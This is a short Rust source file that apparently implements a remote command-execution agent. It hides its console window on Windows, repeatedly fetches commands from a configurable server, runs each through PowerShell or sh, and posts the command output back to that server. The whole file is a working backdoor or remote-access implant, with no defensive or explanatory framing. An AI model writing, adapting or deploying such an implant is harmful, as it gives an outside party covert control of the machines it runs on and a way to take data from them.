#![windows_subsystem = "windows"]

fn main() {
    let client = reqwest::blocking::Client::new();
    let base_url = std::env::var("RC_XD_BASE_URL")
        .unwrap_or_else(|_| "http://localhost:8080".to_string());

    loop {
        let response = client.get(format!("{}/command", base_url)).send();
        if let Err(err) = &response {
            println!("failed to retrieve incomming command: {}", err);
            continue
        }

        let command = response.unwrap().text();
        if let Err(err) = &command {
            println!("failed to retrieve incomming command: {}", err);
            continue
        }

        let command = command.unwrap();
        if command.is_empty() {
            continue
        }

        println!("executing command: {}", command);

        #[cfg(target_os = "windows")]
        let command_output = std::process::Command::new("powershell.exe")
            .arg("-Command")
            .arg(&command)
            .output();

        #[cfg(not(target_os = "windows"))]
        let command_output = std::process::Command::new("sh")
            .arg("-c")
            .arg(&command)
            .output();

        if let Err(err) = &command_output {
            println!("failed to execute command: {}", err);
            continue
        }

        let command_output = command_output.unwrap();
        let command_output_report = format!(
            "Command: {}\nExit Code: {}\nStdout:\n{}\nStderr:\n{}",
            &command,
            &command_output.status.code().unwrap_or_default(),
            String::from_utf8_lossy(&command_output.stdout),
            String::from_utf8_lossy(&command_output.stderr),
        );

        println!("{}", command_output_report);

        let response = client.post(format!("{}/command/output", base_url))
            .body(command_output_report)
            .send();

        match response {
            Ok(response) => println!("command output endpoint responded: {:?}", response),
            Err(err) => println!("failed to report command output: {}", err),
        }

        std::thread::sleep(std::time::Duration::from_millis(500));
    }
}
